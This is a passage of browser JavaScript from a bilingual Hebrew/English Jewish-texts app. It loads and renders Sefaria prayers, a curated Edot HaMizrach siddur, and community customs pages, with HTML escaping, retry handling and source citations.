                ? `<button data-onclick="displayPrayer" data-onclick-arg="${encodeURIComponent(context.prev.name)}" data-onclick-encoding="uri" class="px-3 py-2 bg-slate-100 rounded-sm hover:bg-slate-200 text-slate-700 text-sm font-medium">${t('Previous', 'הקודם')}: ${escapeHtml(getPrayerDisplayName(context.prev.name))}</button>`
                : '<span></span>';

            const nextButton = context.next
                ? `<button data-onclick="displayPrayer" data-onclick-arg="${encodeURIComponent(context.next.name)}" data-onclick-encoding="uri" class="px-3 py-2 bg-slate-100 rounded-sm hover:bg-slate-200 text-slate-700 text-sm font-medium">${t('Next', 'הבא')}: ${escapeHtml(getPrayerDisplayName(context.next.name))}</button>`
                : '<span></span>';

            return `
                <div class="mb-6 space-y-2">
                    <div class="flex items-center justify-between text-xs uppercase tracking-widest text-slate-500 font-semibold">
                        <span>${t('Prayer Navigation', 'ניווט תפילות')}</span>
                        <span>${escapeHtml(progressLabel)}</span>
                    </div>
                    <div class="rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 text-sm text-slate-700 font-medium">${escapeHtml(currentLabel)}</div>
                    <div class="flex items-center justify-between gap-2">${prevButton}${nextButton}</div>
                </div>
            `;
        }

        async function loadCommunitiesMenu(attempt = 0) {
            const list = document.getElementById('communitiesList');

            if (textsCache.communitiesList !== null) {
                populateCommunitiesListHTML(textsCache.communitiesList);
                return;
            }

            try {
                const response = await fetch('/api/communities/list');
                if (!response.ok) throw new Error('communities list unavailable');
                const communities = await response.json();
                textsCache.communitiesList = communities;
                populateCommunitiesListHTML(communities);
            } catch {
                failListRegions([list],
                    t("Couldn't load the communities. Check your connection.", 'לא ניתן לטעון את הקהילות. בדקו את החיבור.'),
                    loadCommunitiesMenu, attempt);
            }
        }

        function populateCommunitiesListHTML(communities) {
            const list = document.getElementById('communitiesList');
            let html = '';
            communities.forEach(community => {
                const name = community.name || '';
                const label = getCommunityDisplayName(name);
                const encodedName = encodeURIComponent(name);
                html += `<button data-onclick="displayCommunity" data-onclick-arg="${encodedName}" data-onclick-encoding="uri" class="block w-full text-start px-3 py-2 rounded-sm hover:bg-[#594176]/10 transition text-slate-700 hover:text-[#594176]">${escapeHtml(label)}</button>`;
            });
            list.innerHTML = html;
            list.setAttribute('aria-busy', 'false');
            applyStaticHebrewFallbackTranslations();
        }

        function getPrayerFallbackParagraphs(rawText) {
            // Returns raw (unescaped) paragraphs -- callers escape at the point
            // text becomes HTML (see displayPrayer's heHtml/enHtml construction
            // and renderHebrewParagraph/renderEnglishParagraph).
            const normalized = normalizeDisplayText(String(rawText || '')).replaceAll('\r', '').trim();
            if (!normalized) return [];
            return normalized
                .split(/\n{2,}/)
                .map(p => p.trim())
                .filter(Boolean);
        }

        async function displayPrayer(prayerName, options = {}) {
            // Shares readText's counter: whichever reader load started last
            // is the one that paints.
            const myRequestId = ++_readTextRequestGen;
            leaveViewScroll();
            appState.shownView = null;
            await swapView(() => {
                homeGrid.style.display = 'none';
                showReaderSkeleton(getPrayerDisplayName(prayerName));
                closeMobilePanels();
                closeTextsMenu();
                closeReaderSettingsPanel();
                setReaderSubtitle('');
                readerTopBar?.classList.add('hidden');
            }, { transition: options.loadRetryAttempt == null });
            if (myRequestId !== _readTextRequestGen) return;

            try {
                await ensurePrayerListLoaded();
                let prayerData = textsCache.prayers[prayerName];
                if (!prayerData) {
                    prayerData = await fetchPrayerData(prayerName);
                    textsCache.prayers[prayerName] = prayerData;
                }

                if (myRequestId !== _readTextRequestGen) return;
                paintPrayerView(prayerData, prayerName, options);
            } catch (err) {
                if (myRequestId !== _readTextRequestGen) return;
                hideReaderSkeleton({ loaded: false });
                applySidebarVisibility();
                renderPrayerLoadError(prayerName, options, err);
            }
        }

        // Both 404, and the preview says the name maps to no prayer at all:
        // retrying won't make one (audit L-3). Sefaria failing to answer is a
        // 404 there too, so anything else may still load on a retry.
        async function prayerNotFoundError(staticResp, sefariaResp) {
            const detail = staticResp.status === 404 && sefariaResp.status === 404
                ? await staticResp.json().then((body) => String(body?.error || ''), () => '')
                : '';
            return Object.assign(new Error('Prayer not found'), { retryable: !/not found/i.test(detail) });
        }

        // Fetch prayer preview and Sefaria full text in parallel.
        async function fetchPrayerData(prayerName) {
            const [staticResp, sefariaResp] = await Promise.all([
                fetch(`/api/prayer/${encodeURIComponent(prayerName)}`),
                fetch(`/api/siddur/full/${encodeURIComponent(prayerName)}`)
            ]);
            let prayerData;
            if (staticResp.ok) {
                prayerData = await staticResp.json();
            } else {
                // No static preview entry for this title — only truly fatal if
                // Sefaria's full liturgical text is unavailable too. Otherwise
                // build a minimal prayerData from Sefaria's response alone
                // instead of discarding a successful fetch just because the
                // separate preview endpoint 404d (a "prayer books not loading
                // at all" case for titles with no hand-curated preview).
                if (!sefariaResp.ok) throw await prayerNotFoundError(staticResp, sefariaResp);
                prayerData = { title: prayerName, content: { he: '', en: '' } };
            }
            // Augment he/en with full Sefaria liturgical text if available
            if (sefariaResp.ok) augmentPrayerWithSefaria(prayerData, prayerName, await sefariaResp.json());
            return prayerData;
        }

        // heHtml/enHtml are trusted pre-built HTML strings (rendered
        // directly via the isHtml path), so their content is escaped
        // here at the point each tag is built. paragraphPairs instead
        // stores raw (unescaped) text -- its consumer,
        // renderPrayerBilingualRow/renderHebrewParagraph/
        // renderEnglishParagraph, is the single point where that text
        // becomes HTML and escapes it there. Keeping both variants
        // raw-vs-escaped straight here (rather than escaping once and
        // reusing the same string for both) is what avoids
        // double-escaping paragraphPairs downstream.
        //
        // he/en are normalized with normalizeDisplayTextPreservingEmphasis()
        // rather than normalizeDisplayText() so Sefaria's <b>/<strong>/
        // <i>/<em> rubric emphasis survives into paragraphPairs (and
        // heHtml/enHtml, escaped below via
        // escapeDisplayTextPreservingEmphasis()) instead of being
        // stripped like every other tag. isDuplicateLeadingLine()'s own
        // normalizeComparablePrayerTitle() call re-normalizes with the
        // full strip internally, so passing it emphasis-preserving text
        // doesn't change that comparison.
        function augmentPrayerWithSefaria(prayerData, prayerName, sefariaData) {
            if (!sefariaData.lines || sefariaData.lines.length === 0) return;
            const fallbackHeParagraphs = getPrayerFallbackParagraphs(prayerData?.content?.he || '');
            const fallbackEnParagraphs = getPrayerFallbackParagraphs(prayerData?.content?.en || '');
            const paragraphPairs = [];
            const isDuplicateLeadingLine = leadingTitleSkipper(prayerData?.title || prayerName, paragraphPairs);
            let heHtml = '';
            let enHtml = '';

            sefariaData.lines.forEach(line => {
                const entry = line.type === 'header'
                    ? prayerHeaderEntry(line, isDuplicateLeadingLine)
                    : prayerParagraphEntry(line, isDuplicateLeadingLine, fallbackHeParagraphs, fallbackEnParagraphs);
                if (!entry) return;
                heHtml += entry.heHtml;
                enHtml += entry.enHtml;
                paragraphPairs.push(entry.pair);
            });

            prayerData.content.he = heHtml;
            prayerData.content.en = enHtml;
            prayerData.paragraphPairs = paragraphPairs;
            prayerData.hasSefaria = true;
        }

        // A predicate that is true once, for the first line that only repeats the prayer's title.
        function leadingTitleSkipper(title, paragraphPairs) {
            const comparablePrayerTitle = normalizeComparablePrayerTitle(title);
            let skippedLeadingDuplicateTitle = false;
            return (heCandidate = '', enCandidate = '') => {
                if (skippedLeadingDuplicateTitle || paragraphPairs.length > 0 || !comparablePrayerTitle) {
                    return false;
                }
                const comparableLine = normalizeComparablePrayerTitle(`${heCandidate} ${enCandidate}`);
                if (!comparableLine) return false;
                const duplicate = comparableLine === comparablePrayerTitle
                    || comparableLine.startsWith(`${comparablePrayerTitle} `)
                    || comparablePrayerTitle.startsWith(`${comparableLine} `);
                if (duplicate) {
                    skippedLeadingDuplicateTitle = true;
                }
                return duplicate;
            };
        }

        function prayerHeaderEntry(line, isDuplicateLeadingLine) {
            const heHeaderRaw = normalizeDisplayTextPreservingEmphasis(line.he || '');
            const enHeaderRaw = normalizeDisplayTextPreservingEmphasis(line.en || '');
            if (isDuplicateLeadingLine(heHeaderRaw, enHeaderRaw)) return null;
            return {
                heHtml: `<h3 class="text-xl font-bold font-hebrew mt-8 mb-3 pb-1 border-b border-slate-200">${escapeDisplayTextPreservingEmphasis(heHeaderRaw)}</h3>`,
                enHtml: `<h3 class="text-xl font-bold font-serif mt-8 mb-3 pb-1 border-b border-slate-200">${escapeDisplayTextPreservingEmphasis(enHeaderRaw)}</h3>`,
                pair: { type: 'header', he: heHeaderRaw, en: enHeaderRaw },
            };
        }

        // Paragraph lines borrow the preview's text where Sefaria has none.
        function prayerParagraphEntry(line, isDuplicateLeadingLine, fallbackHeParagraphs, fallbackEnParagraphs) {
            const heLine = normalizeDisplayTextPreservingEmphasis(line.he || '');
            const enLine = normalizeDisplayTextPreservingEmphasis(line.en || '');
            if (isDuplicateLeadingLine(heLine, enLine)) return null;
            let heParagraph = heLine;
            let enParagraph = enLine;

            if (!heParagraph && fallbackHeParagraphs.length > 0) {
                heParagraph = fallbackHeParagraphs.shift();
            }
            if (!enParagraph && fallbackEnParagraphs.length > 0) {
                enParagraph = fallbackEnParagraphs.shift();
            }

            if (!heParagraph && !enParagraph) return null;

            return {
                heHtml: heParagraph ? `<p class="mb-3">${escapeDisplayTextPreservingEmphasis(heParagraph)}</p>` : '',
                enHtml: enParagraph ? `<p class="mb-3">${escapeDisplayTextPreservingEmphasis(enParagraph)}</p>` : '',
                pair: { type: 'paragraph', he: heParagraph, en: enParagraph },
            };
        }

        function paintPrayerView(prayerData, prayerName, options) {
            hideReaderSkeleton();
            applySidebarVisibility();

            document.getElementById('readerTitle').innerText = prayerData.title;
            setCurrentView('prayer', prayerName, prayerData.title || prayerName, options);

            // Store current prayer content globally for language switching
            window.currentPrayerContent = prayerData.content;
            window.currentPrayerParagraphPairs = prayerData.paragraphPairs || [];
            window.currentPrayerIsHtml = prayerData.hasSefaria || false;
            window.currentPrayerName = prayerName;
            window.currentCommunityData = null;
            window.currentTextPayload = null;
            window.currentTextPayloadChain = [];
            resetInfiniteReaderState(null);
            collapseCommentaryPanel();
            resetSelectionInsights();
            syncReaderSettingsVisibility();

            document.getElementById('readerContent').innerHTML = renderPrayerContent(prayerData.content, prayerName);
            document.getElementById('readerSources').innerHTML = '';
            applyReaderPreferences();

            sidebarContent.innerHTML = `
                <div class="text-xs space-y-2">
                    <div><span class="font-bold text-slate-700">${t('From:', 'מקור:')}</span> <span class="text-slate-500">${prayerData.hasSefaria ? t('Sefaria Liturgy Collection', 'אוסף ליטורגיה מספריא') : t('Sefaria Prayer Book Preview', 'תצוגה מקדימה של סידור מספריא')}</span></div>
                    <div><span class="font-bold text-slate-700">${t('Languages:', 'שפות:')}</span> <span class="text-slate-500">${t('Hebrew &amp; English', 'עברית ואנגלית')}</span></div>
                </div>`;

            if (!restoreViewScroll(options.restoreScroll, 'prayer')) scrollPrimaryToTop('smooth');
        }

        // L-3: the prayer's own name stays the title (not the last view's),
        // with an alert: Retry when the network or Sefaria failed, "Back to
        // prayers" when there is no such prayer.
        function renderPrayerLoadError(prayerName, options, err) {
            const content = document.getElementById('readerContent');
            const regions = window.ShelahLoadRegion;
            if (!content || !regions) return;
            document.getElementById('readerTitle').textContent = getPrayerDisplayName(prayerName);
            readerTopBar?.classList.add('hidden');
            const missing = err?.retryable === false;
            const attempt = Number(options.loadRetryAttempt) || 0;
            const retry = (nextAttempt) => {
                if (reader.classList.contains('hidden')) return;
                void displayPrayer(prayerName, { ...options, loadRetryAttempt: nextAttempt });
            };
            regions.renderRegionError(content, {
                message: missing
                    ? t("This prayer isn't in the library.", 'התפילה הזו אינה בספרייה.')
                    : t("Couldn't load this prayer. Check your connection.", 'לא ניתן היה לטעון את התפילה. בדקו את החיבור.'),
                retry: missing ? null : () => retry(0),
                actions: missing ? [{ label: t('Back to prayers', 'חזרה לתפילות'), onClick: () => openTextsMenu() }] : [],
            });
            if (missing) {
                if (options.fromRoute) window.ShelahRouter?.markNotFound();
            } else {
                regions.retryLater(content, retry, { attempt });
            }
        }

        function renderPrayerContent(content, prayerName = '') {
            let html = renderPrayerNavigation(prayerName);
            html += '<div class="prose prose-slate max-w-none font-serif leading-relaxed text-slate-800">';
            html += `<div id="prayer-display" class="prayer-clean-lines"></div>`;
            html += `</div>`;

            return html;
        }

        // ─── Siddur (Prayers redesign) ─────────────────────────────────────
        // The curated Edot HaMizrach siddur at /siddur/<rite>[/<service>[/<section>]].
        // static/js/siddur.js (window.ShelahSiddur) loads and draws the page
        // body; this owns the reader chrome, the split displayPrayer has.
        // prepare() only loads, so a load this view has moved on from is
        // dropped before anything is drawn.
        async function displaySiddur(value, options = {}) {
            const myRequestId = ++_readTextRequestGen;
            leaveViewScroll();
            appState.shownView = null;
            await swapView(() => {
                homeGrid.style.display = 'none';
                showReaderSkeleton(t('Siddur', 'סידור'));
                closeMobilePanels();
                closeTextsMenu();
                closeReaderSettingsPanel();
                setReaderSubtitle('');
                readerTopBar?.classList.add('hidden');
            }, { transition: options.loadRetryAttempt == null });
            if (myRequestId !== _readTextRequestGen) return;

            const siddur = window.ShelahSiddur;
            try {
                if (!siddur) throw new Error('The siddur module has not loaded');
                const prepared = await siddur.prepare(value);
                if (myRequestId !== _readTextRequestGen) return;
                hideReaderSkeleton();
                applySidebarVisibility();

                window.currentPrayerContent = null;
                window.currentPrayerParagraphPairs = [];
                window.currentPrayerIsHtml = false;
                window.currentPrayerName = null;
                window.currentCommunityData = null;
                window.currentTextPayload = null;
                window.currentTextPayloadChain = [];
                resetInfiniteReaderState(null);
                collapseCommentaryPanel();
                resetSelectionInsights();
                syncReaderSettingsVisibility();
                document.getElementById('readerSources').innerHTML = '';

                const { label, section } = siddur.mount(document.getElementById('readerContent'), prepared);
                document.getElementById('readerTitle').innerText = label;
                setCurrentView('siddur', value, label, options);
                const source = prepared.toc.source;
                sidebarContent.innerHTML = `
                    <div class="text-xs space-y-2">
                        <div><span class="font-bold text-slate-700">${t('From:', 'מקור:')}</span> <span class="text-slate-500">${escapeHtml(source.index)} · Sefaria</span></div>
                        <div><span class="font-bold text-slate-700">${t('Hebrew:', 'עברית:')}</span> <span class="text-slate-500">${escapeHtml(`${source.he.title} (${source.he.license})`)}</span></div>
                        <div><span class="font-bold text-slate-700">${t('English:', 'אנגלית:')}</span> <span class="text-slate-500">${escapeHtml(`${source.en.title} (${source.en.license})`)}</span></div>
                    </div>`;
                renderSiddurMenus();
                if (!section && !restoreViewScroll(options.restoreScroll, 'siddur')) scrollPrimaryToTop('auto');
            } catch (err) {
                if (myRequestId !== _readTextRequestGen) return;
                hideReaderSkeleton({ loaded: false });
                applySidebarVisibility();
                renderSiddurLoadError(value, options, err);
            }
        }

        // A page the siddur doesn't have gets "Back to the siddur" (and the
        // next visit a real 404); anything else -- offline, a server error --
        // offers Retry and retries on its own (static/js/load-region.js).
        function renderSiddurLoadError(value, options, err) {
            const content = document.getElementById('readerContent');
            const regions = window.ShelahLoadRegion;
            if (!content || !regions) return;
            document.getElementById('readerTitle').textContent = t('Siddur', 'סידור');
            readerTopBar?.classList.add('hidden');
            const missing = err?.name === 'SiddurNotFound';
            const attempt = Number(options.loadRetryAttempt) || 0;
            const retry = (nextAttempt) => {
                if (reader.classList.contains('hidden')) return;
                void displaySiddur(value, { ...options, loadRetryAttempt: nextAttempt });
            };
            regions.renderRegionError(content, {
                message: missing
                    ? t("This page isn't in the siddur.", 'הדף הזה אינו בסידור.')
                    : t("Couldn't load the siddur. Check your connection.", 'לא ניתן היה לטעון את הסידור. בדקו את החיבור.'),
                retry: missing ? null : () => retry(0),
                actions: missing ? [{ label: t('Back to the siddur', 'חזרה לסידור'), onClick: () => void displaySiddur('edot-hamizrach') }] : [],
            });
            if (missing) {
                if (options.fromRoute) window.ShelahRouter?.markNotFound();
            } else {
                regions.retryLater(content, retry, { attempt });
            }
        }

        // The siddur's table of contents in the Texts menu and the sidebar,
        // with the service on screen marked. Called when those menus load,
        // on a language switch, and by main.js once the module is up (it can
        // arrive after the classic script first asks). A function
        // declaration, so the startup toggleLanguage can call it early.
        function renderSiddurMenus() {
            const siddur = window.ShelahSiddur;
            if (!siddur) return;
            const shown = appState?.currentView?.type === 'siddur' ? String(appState.currentView.value || '') : '';
            const current = shown.split('/')[1] || null;
            const mounts = [
                [document.getElementById('siddurTocMenu'), { compact: false, current }],
                [document.getElementById('siddurTocSidebar'), { compact: true, current }],
            ];
            mounts.forEach(([mount, opts]) => { void renderSiddurMount(mount, opts, 0); });
        }
        window.renderSiddurMenus = renderSiddurMenus;

        // One menu's table of contents. A failed load retries on the region's
        // own backoff (attempt carries through, so the delays grow and then
        // stop for a manual Retry) instead of starting over at the shortest
        // delay every time -- which retried a dead endpoint forever.
        function renderSiddurMount(mount, opts, attempt) {
            const siddur = window.ShelahSiddur;
            if (!mount || !siddur) return Promise.resolve();
            return siddur.renderToc(mount, opts).catch(() => {
                failListRegions([mount],
                    t("Couldn't load the siddur. Check your connection.", 'לא ניתן היה לטעון את הסידור. בדקו את החיבור.'),
                    (next) => renderSiddurMount(mount, opts, next), attempt);
            });
        }

        // Siddur links (menus, cards, breadcrumb, next/previous) are real
        // links -- a new tab, a copied or shared URL all work -- that a plain
        // click opens in place.
        document.addEventListener('click', (event) => {
            const link = event.target.closest?.('a[data-siddur-path]');
            if (!link || event.defaultPrevented || event.button !== 0
                || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;
            event.preventDefault();
            void displaySiddur(link.dataset.siddurPath);
        });

        async function displayCommunity(communityName, options = {}) {
            const myRequestId = ++_readTextRequestGen;
            leaveViewScroll();
            appState.shownView = null;
            await swapView(() => {
                homeGrid.style.display = 'none';
                showReaderSkeleton(getCommunityDisplayName(communityName));
                closeMobilePanels();
                closeTextsMenu();
                closeReaderSettingsPanel();
                setReaderSubtitle('');
                readerTopBar?.classList.add('hidden');
            }, { transition: options.loadRetryAttempt == null });
            if (myRequestId !== _readTextRequestGen) return;

            try {
                let communityData = textsCache.communities[communityName];
                if (!communityData) {
                    communityData = await fetchCommunityData(communityName);
                    textsCache.communities[communityName] = communityData;
                }

                if (myRequestId !== _readTextRequestGen) return;
                paintCommunityView(communityData, communityName, options);
            } catch (err) {
                if (myRequestId !== _readTextRequestGen) return;
                hideReaderSkeleton({ loaded: false });
                applySidebarVisibility();
                renderCommunityLoadError(communityName, options, err);
            }
        }

        async function fetchCommunityData(communityName) {
            const response = await fetch(`/api/community/${encodeURIComponent(communityName)}`);
            // The customs are the app's own data: a 404 is a name it
            // doesn't have, and a retry won't change that.
            if (!response.ok) {
                throw Object.assign(new Error(`Community request failed (${response.status})`), { retryable: response.status !== 404 });
            }
            return response.json();
        }

        function communitySidebarMarkup(communityData, communityLabel) {
            const majorSources = Array.isArray(communityData?.major_authorities)
                ? communityData.major_authorities.slice(0, 4).join(', ')
                : '';
            return `
                <div class="text-xs space-y-2">
                    <div><span class="font-bold text-slate-700">${t('Community:', 'קהילה:')}</span> <span class="text-slate-500">${communityLabel}</span></div>
                    <div><span class="font-bold text-slate-700">${t('Source Base:', 'בסיס מקורות:')}</span> <span class="text-slate-500">${t('Community source registry + major poskim', 'רישום מקורות קהילתי + פוסקים מרכזיים')}</span></div>
                    ${majorSources ? `<div><span class="font-bold text-slate-700">${t('Major Authorities:', 'סמכויות מרכזיות:')}</span> <span class="text-slate-500" dir="auto">${escapeHtml(communitySourceText(majorSources))}</span></div>` : ''}
                    <div><span class="font-bold text-slate-700">${t('Primary Origin:', 'מוצא עיקרי:')}</span> <span class="text-slate-500" dir="auto">${communityData.primary_origin ? escapeHtml(communityLabelText(communityData.primary_origin)) : '--'}</span></div>
                </div>`;
        }

        function paintCommunityView(communityData, communityName, options) {
            hideReaderSkeleton();
            applySidebarVisibility();

            // A link can spell the name loosely (/?community=moroccan);
            // the data's own name is the one to show.
            const canonicalName = String(communityData?.name || communityName).trim();
            const communityLabel = getCommunityDisplayName(canonicalName);
            const communityTitle = isHebrewMode()
                ? `מנהגי קהילת ${communityLabel}`
                : `${canonicalName} Community Customs`;
            document.getElementById('readerTitle').innerText = communityTitle;
            setCurrentView('community', communityName, communityTitle, options);
            document.getElementById('readerContent').innerHTML = renderCommunityContent(communityData);
            window.currentCommunityData = communityData;
            window.currentPrayerContent = null;
            window.currentPrayerParagraphPairs = [];
            window.currentPrayerName = null;
            window.currentTextPayload = null;
            window.currentTextPayloadChain = [];
            resetInfiniteReaderState(null);
            collapseCommentaryPanel();
            resetSelectionInsights();
            syncReaderSettingsVisibility();
            document.getElementById('readerSources').innerHTML = '';

            sidebarContent.innerHTML = communitySidebarMarkup(communityData, communityLabel);

            if (!restoreViewScroll(options.restoreScroll, 'community')) scrollPrimaryToTop('smooth');
        }

        function renderCommunityLoadError(communityName, options, err) {
            const content = document.getElementById('readerContent');
            const regions = window.ShelahLoadRegion;
            if (!content || !regions) return;
            const missing = err?.retryable === false;
            const attempt = Number(options.loadRetryAttempt) || 0;
            const retry = (nextAttempt) => {
                if (reader.classList.contains('hidden')) return;
                void displayCommunity(communityName, { ...options, loadRetryAttempt: nextAttempt });
            };
            regions.renderRegionError(content, {
                message: missing
                    ? t("There are no customs for this community yet.", 'אין עדיין מנהגים לקהילה זו.')
                    : t("Couldn't load these customs. Check your connection.", 'לא ניתן היה לטעון את המנהגים. בדקו את החיבור.'),
                retry: missing ? null : () => retry(0),
                actions: missing ? [{ label: t('Back to communities', 'חזרה לקהילות'), onClick: () => openTextsMenu() }] : [],
            });
            if (missing) {
                if (options.fromRoute) window.ShelahRouter?.markNotFound();
            } else {
                regions.retryLater(content, retry, { attempt });
            }
        }

        // The customs data is English; its titles and sources have Hebrew
        // names (static/js/community-labels.js). Unknown text stays as is.
        function communityLabelText(text) {
            const labels = window.ShelahCommunityLabels;
            const lang = isHebrewMode() ? 'he' : 'en';
            return labels ? labels.label(String(text || '').trim(), lang) : String(text || '').trim();
        }

        function communitySourceText(text) {
            const labels = window.ShelahCommunityLabels;
            const lang = isHebrewMode() ? 'he' : 'en';
            return labels ? labels.sourceList(text, lang) : String(text || '').trim();
        }

        // A "weigh this" chip for entries the research marked disputed, regional
        // or thinly sourced. Words, not colour alone; well-attested shows none.
        function communityConfidenceChip(confidence) {
            const info = window.ShelahCommunityLabels?.confidence(confidence, isHebrewMode() ? 'he' : 'en');
            if (!info) return '';
            return `<span class="community-confidence" data-confidence="${escapeHtml(info.key)}" title="${escapeHtml(info.hint)}">${escapeHtml(info.label)}</span>`;
        }

        // The line under a disputed, regional or thinly sourced entry: rabbis rule
        // differently, so the reader asks their own. Nothing for well-attested.
        function communityRabbiNote(confidence) {
            const info = window.ShelahCommunityLabels?.confidence(confidence, isHebrewMode() ? 'he' : 'en');
            if (!info) return '';
            return `<p class="community-rabbi-note" data-confidence="${escapeHtml(info.key)}" dir="auto">${escapeHtml(info.note)}</p>`;
        }

        // The hand-written Hebrew of a field ("topic_he") in Hebrew mode; the English otherwise or when there is none.
        function communityText(item, field) {
            const english = String(item?.[field] ?? '').trim();
            if (!isHebrewMode()) return english;
            return String(item?.[`${field}_he`] ?? '').trim() || english;
        }

        // Subgroup differences: "Turkish: no rice." One line each.
        function communityVariantsHtml(variants) {
            const rows = (Array.isArray(variants) ? variants : [])
                .filter((v) => v && typeof v === 'object' && String(v.practice || '').trim())
                .map((v) => {
                    const subgroup = String(v.subgroup || '').trim();
                    const label = subgroup ? `<span class="font-semibold">${escapeHtml(subgroup)}:</span> ` : '';
                    return `<li>${label}${escapeHtml(String(v.practice).trim())}</li>`;
                });
            if (!rows.length) return '';
            return `<div class="community-variants">
                <p class="community-subhead">${t('Where communities differ', 'הבדלים בין עדות')}</p>
                <ul class="list-disc ml-5 text-slate-600 text-sm space-y-1" dir="auto">${rows.join('')}</ul>
            </div>`;
        }

        function communityExternalLink(url, text) {
            const href = safeHref(url);
            if (href === '#') return escapeHtml(text);
            return `<a class="community-link" href="${href}" target="_blank" rel="noopener noreferrer">${escapeHtml(text)}<span class="sr-only"> ${t('(opens in a new tab)', '(נפתח בלשונית חדשה)')}</span></a>`;
        }

        // "Source: X" (linked when the entry names the page it came from), then
        // up to three further references that are not the same page.
        function communitySourceHtml(item) {
            const source = communitySourceText(item.source);
            const sourceUrl = String(item.source_url || '').trim();
            const refs = (Array.isArray(item.references) ? item.references : [])
                .filter((r) => r?.url && r.title && String(r.url).trim() !== sourceUrl)
                .slice(0, 3);
            if (!source && !refs.length) return '';
            const parts = [];
            if (source) {
                parts.push(`<span class="font-semibold">${t('Source:', 'מקור:')}</span> ${sourceUrl ? communityExternalLink(sourceUrl, source) : escapeHtml(source)}`);
            }
            if (refs.length) {
                parts.push(`<span class="font-semibold">${t('Also:', 'ראו גם:')}</span> ${refs.map((r) => communityExternalLink(r.url, r.title)).join(' · ')}`);
            }
            return `<p class="text-slate-500 text-xs mt-1" dir="auto">${parts.join(' &nbsp;|&nbsp; ')}</p>`;
        }

        // "Disputes" and "gaps" from the research: what sources disagree on, and
        // what this page does not (yet) document. Collapsed; native <details>.
        function communityNotesHtml(communityData) {
            const block = (title, items, intro = '') => {
                if (!items.length) return '';
                const note = intro ? `<p class="community-rabbi-note" dir="auto">${escapeHtml(intro)}</p>` : '';
                const listItems = items.map((x) => `<li>${escapeHtml(x)}</li>`).join('');
                return `<details class="community-notes">
                        <summary>${escapeHtml(title)} <span class="community-notes-count">(${items.length})</span></summary>
                        ${note}
                        <ul class="list-disc ml-5 text-slate-600 text-sm space-y-1" dir="auto">${listItems}</ul>
                   </details>`;
            };
            const list = (value) => (Array.isArray(value) ? value : []).map((x) => String(x || '').trim()).filter(Boolean);
            const html = block(t('Where sources disagree', 'היכן המקורות חלוקים'), list(communityData?.disputes),
                    t('Rabbis differ on these points. Each rabbi gives their own answer, so ask your own rabbi.',
                      'רבנים חלוקים בנקודות אלה. כל רב משיב על פי הכרעתו, ולכן שאלו את הרב שלכם.'))
                + block(t('Not yet documented', 'עדיין לא מתועד'), list(communityData?.gaps));
            return html ? `<div class="prayer-clean-row py-2"><div class="prayer-clean-en" dir="ltr">${html}</div></div>` : '';
        }

        function communityDistinctiveHtml(communityData) {
            const items = (Array.isArray(communityData?.distinctive_customs) ? communityData.distinctive_customs : [])
                .filter((c) => c?.name);
            if (!items.length) return '';
            const rows = items.map((c) => `
                <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                    <div class="prayer-clean-en" dir="ltr">
                        <div class="font-semibold text-slate-800" dir="auto">${escapeHtml(communityText(c, 'name'))}${communityConfidenceChip(c.confidence)}</div>
                        ${communityText(c, 'description') ? `<p class="text-slate-700 mt-1" dir="auto">${escapeHtml(communityText(c, 'description'))}</p>` : ''}
                        ${communityRabbiNote(c.confidence)}
                        ${c.when ? `<p class="text-slate-500 text-xs mt-1" dir="auto"><span class="font-semibold">${t('When:', 'מתי:')}</span> ${escapeHtml(c.when)}</p>` : ''}
                        ${communitySourceHtml(c)}
                    </div>
                </div>`).join('');
            return `
                <div class="prayer-clean-row border-b border-slate-200 py-2">
                    <div class="prayer-clean-en" dir="ltr"><h3 class="font-bold text-slate-800" dir="auto">${t('Distinctive customs', 'מנהגים ייחודיים')}</h3></div>
                </div>${rows}`;
        }

        function renderCommunityContent(communityData) {
            const communityName = String(communityData?.name || '').trim();
            const communityLabel = getCommunityDisplayName(communityName);
            const customs = communityData?.customs || {};

            const entries = Object.values(customs)
                .filter((item) => item && typeof item === 'object')
                .sort((a, b) => {
                    const aCategory = String(a.category || '').toLowerCase();
                    const bCategory = String(b.category || '').toLowerCase();
                    if (aCategory !== bCategory) return aCategory.localeCompare(bCategory);
                    return String(a.topic || '').toLowerCase().localeCompare(String(b.topic || '').toLowerCase());
                });

            let rows = '';
            rows += `
                <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                    <div class="prayer-clean-en" dir="ltr">
                        <div class="font-bold text-slate-800" dir="auto">${escapeHtml(isHebrewMode() ? `מנהגי קהילת ${communityLabel}` : `${communityName} Community Customs`)}</div>
                        ${communityData?.primary_origin
                    ? `<div class="text-slate-600 mt-1" dir="auto"><span class="font-semibold">${t('Primary Origin:', 'מוצא עיקרי:')}</span> ${escapeHtml(communityLabelText(communityData.primary_origin))}</div>`
                    : ''}
                    </div>
                </div>
            `;

            if (!entries.length) {
                rows += `
                    <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                        <div class="prayer-clean-en text-slate-500 italic" dir="ltr">
                            ${t('No structured customs are available for this community right now.', 'אין כרגע נתוני מנהגים מובנים לקהילה זו.')}
                        </div>
                    </div>
                `;
            } else {
                entries.forEach((item) => {
                    const category = String(item.category || '').trim();
                    const topic = String(item.topic || '').trim();
                    const topicHe = isHebrewMode() ? String(item.topic_he || '').trim() : '';
                    const title = [category && communityLabelText(category), topicHe || (topic && communityLabelText(topic))]
                        .filter(Boolean).join(': ') || t('Custom Entry', 'פריט מנהג');
                    const ruling = communityText(item, 'ruling');
                    const practices = Array.isArray(item.common_practices)
                        ? item.common_practices.map((entry) => String(entry || '').trim()).filter(Boolean)
                        : [];
                    const practiceItems = practices.map((entry) => `<li>${escapeHtml(entry)}</li>`).join('');

                    rows += `
                        <div class="prayer-clean-row border-b border-slate-200 last:border-b-0 py-2">
                            <div class="prayer-clean-en" dir="ltr">
                                <div class="font-semibold text-slate-800" dir="auto">${escapeHtml(title)}${communityConfidenceChip(item.confidence)}</div>
                                ${ruling ? `<p class="text-slate-700 mt-1" dir="auto">${escapeHtml(ruling)}</p>` : ''}
                                ${communityRabbiNote(item.confidence)}
                                ${communitySourceHtml(item)}
                                ${practices.length
                            ? `<ul class="list-disc ml-5 text-slate-600 text-sm space-y-1 mt-2" dir="auto">${practiceItems}</ul>`
                            : ''}
                                ${communityVariantsHtml(item.variants)}
                            </div>
                        </div>
                    `;
                });
            }

            rows += communityDistinctiveHtml(communityData);
            rows += communityNotesHtml(communityData);

